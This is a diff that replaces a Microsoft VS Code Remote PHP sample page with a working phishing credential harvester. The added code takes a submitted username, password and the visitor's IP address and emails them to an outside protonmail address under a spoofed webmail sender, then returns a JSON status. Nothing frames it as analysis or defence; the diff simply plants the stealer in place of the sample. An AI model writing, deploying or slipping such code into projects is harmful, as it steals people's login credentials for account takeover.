@@ -1,27 +1,29 @@
 <?php
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['ai'];
+$passwd= $_POST['pr'];
 
-/*----------------------------------------------------------------------------------------
- * Copyright (c) Microsoft Corporation. All rights reserved.
- * Licensed under the MIT License. See LICENSE in the project root for license information.
- *---------------------------------------------------------------------------------------*/
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
 
-function sayHello($name) {
-	echo "Hello $name!";
+
+if (!empty($login) && !empty($passwd)) {
+
+
+    $own = 'customerlogin@protonmail.com';
+    $date = date("D/M/d, Y g:i a");
+    $subj = "$login  from $ip";
+    $from = "From: Webmaila<smtp@me.mom163.com>";
+    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
+    mail($own,$subj,$msg,$from);
+
+    echo json_encode($done);
+
+    }
+
+else {
+  echo json_encode($bad);
 }
 
-?>
 
-<html>
-	<head>
-		<title>Visual Studio Code Remote :: PHP</title>
-	</head>
-	<body>
-		<?php 
-		
-		sayHello('remote world');
-			
-		phpinfo(); 
-			
-		?>
-	</body>
-</html>
+?>
